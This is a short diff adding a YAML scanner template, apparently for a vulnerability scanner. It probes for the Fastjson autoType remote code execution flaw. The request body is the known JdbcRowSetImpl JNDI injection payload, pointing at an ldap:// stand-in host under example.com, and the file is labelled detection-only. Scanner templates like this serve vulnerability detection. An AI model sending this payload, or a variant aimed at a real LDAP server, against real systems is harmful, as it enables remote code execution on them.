@@ -1,0 +1,19 @@
+name: poc-fastjson-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/"
+      headers:
+        Content-Type: "application/json"
+      body: '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{r0}}.example.com","autoCommit":true}}'
+    expression: response.status == 500 || response.body.bcontains("fastjson") || response.body.bcontains("com.alibaba.fastjson")
+expression: r0()
+detail:
+  author: sxel
+  description: Fastjson autoType bypass RCE probe (detection-only, OOB marker)
+  severity: high
+  tags: fastjson,java,rce
